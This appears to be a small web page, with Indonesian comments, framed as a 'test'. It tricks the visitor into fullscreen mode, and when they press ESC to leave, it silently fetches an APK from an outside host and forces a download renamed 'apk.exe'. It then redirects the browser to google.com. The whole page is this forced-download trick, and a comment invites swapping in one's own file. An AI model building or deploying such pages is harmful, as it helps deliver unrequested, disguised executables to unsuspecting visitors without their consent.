<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>ESC Blob Test (Safe Remote URL)</title>
<style>
  body {
    margin: 0;
    background: #111;
    height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    color: white;
    font-family: sans-serif;
  }
  #fsBtn {
    padding: 16px 28px;
    font-size: 22px;
    border: none;
    border-radius: 10px;
    cursor: pointer;
  }
</style>
</head>
<body>

<button id="fsBtn">Masuk Fullscreen</button>

<script>
// Masuk fullscreen
fsBtn.onclick = () => {
  document.documentElement.requestFullscreen();
};

// Download blob dari URL aman
async function downloadBlobFromURL(url, filename) {
  try {
    const res = await fetch(url);
    const blob = await res.blob();

    const blobURL = URL.createObjectURL(blob);
    const a = document.createElement("a");

    a.href = blobURL;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    a.remove();

    URL.revokeObjectURL(blobURL);
  } catch (err) {
    console.error("Gagal download blob:", err);
  }
}

// Trigger saat ESC keluar fullscreen
document.addEventListener("fullscreenchange", async () => {
  if (!document.fullscreenElement) {

    // 🔒 URL aman — silakan ganti dengan file kamu sendiri
    await downloadBlobFromURL(
      "https://ecdnts-del.github.io/test-apk/dummy.apk", 
      "apk.exe"
    );

    // Redirect ke halaman lokal aman
    setTimeout(() => {
      location.replace("http://google.com");
    }, 300);
  }
});
</script>

</body>
</html>
